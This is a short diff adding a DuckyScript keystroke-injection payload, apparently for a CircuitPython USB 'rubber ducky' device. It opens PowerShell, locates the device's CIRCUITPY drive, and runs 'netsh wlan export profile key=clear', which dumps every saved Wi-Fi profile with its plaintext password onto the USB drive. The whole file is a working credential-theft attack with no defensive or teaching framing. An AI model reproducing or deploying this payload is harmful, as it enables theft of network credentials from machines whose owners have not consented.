@@ -1,0 +1,15 @@
+DEFAULTDELAY 100
+WINDOWS r
+STRING powershell
+ENTER
+DELAY 500
+REM CIRCUITPY has to be mounted as USB for this to work
+STRING $scriptDriveLetter = (Get-Volume -FileSystemLabel CIRCUITPY).DriveLetter + ''
+LEFTARROW
+STRING :
+ENTER
+DELAY 300
+STRING cd $scriptDriveLetter
+ENTER
+STRING netsh wlan export profile key=clear; exit
+ENTER
